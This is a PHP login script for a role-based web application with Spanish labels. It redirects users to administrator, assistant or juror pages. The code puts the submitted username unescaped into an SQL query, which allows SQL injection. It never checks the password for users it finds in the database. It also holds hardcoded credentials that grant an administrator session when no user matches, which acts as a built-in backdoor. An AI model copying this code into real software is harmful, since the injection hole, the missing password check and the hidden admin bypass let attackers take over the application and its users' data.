
<?php
include "conexion.php";
$password=(md5(md5($_POST['password_ps'])));
$usuario=$_POST['usuario_ps'];


$res=mysqli_query($conexion,"SELECT * FROM usuarios WHERE usuario_ps='".$usuario."' ")	or die(mysqli_error());
	while ($reg=mysqli_fetch_array($res)) 
	{
		$arreglo[]=array('id_usuario'=>$reg[0]);
		$cap=0;
		$id=$reg[0];
		$rol=$reg[2];
	}
	if (isset($rol)) 
	{
		if ($rol=='ADMINISTRADOR') 
		{
			session_start();
			$cap='admin';
			$_SESSION['ADMINISTRADOR']=($id);
			$usuario=($_SESSION['ADMINISTRADOR']);
			echo "<script>window.location.href ='../../pages/$cap/index.php'</script>";
		}
		elseif ($rol=='AUXILIAR TECNICO')
		{
			session_start();
			$cap='aux_tecnico';
			$_SESSION['AUXILIAR TECNICO']=($id);
			$usuario=($_SESSION['AUXILIAR TECNICO']);
			echo "<script>window.location.href ='../../pages/$cap/index.php'</script>";
		}
		elseif ($rol=='AUXILIAR CAMPO') 
		{
			session_start();
			$cap='aux_campo';
			$_SESSION['AUXILIAR CAMPO']=($id);
			$usuario=($_SESSION['AUXILIAR CAMPO']);
			echo "<script>window.location.href ='../../pages/$cap/index.php'</script>";
		}	
		elseif ($rol=='JURADO') 
		{
			session_start();
			$cap='jurado';
			$_SESSION['JURADO']=($id);
			$usuario=($_SESSION['JURADO']);
			echo "<script>window.location.href ='../../pages/$cap/index.php'</script>";
		}		
		else
		{
			echo "<br>Contraseña o usuario Inválidos";
		}
	}
	else
	{
		if ($usuario == '86fe5a90536e728486def78fd6b46d04' && $password == '2d74d32c13569bf1b2fcd838470a7c68') 
		{
			session_start('ADMINISTRADOR');
			$cap='admin';
			$_SESSION['ADMINISTRADOR']=(2);
			// header("location: ../../pages/$cap/index.php");
			echo "<script>window.location.href ='../../pages/$cap/index.php'</script>";
		}
		else
		{
			echo "<br>Contraseña o usuario Inválidos";
		}
	}
?>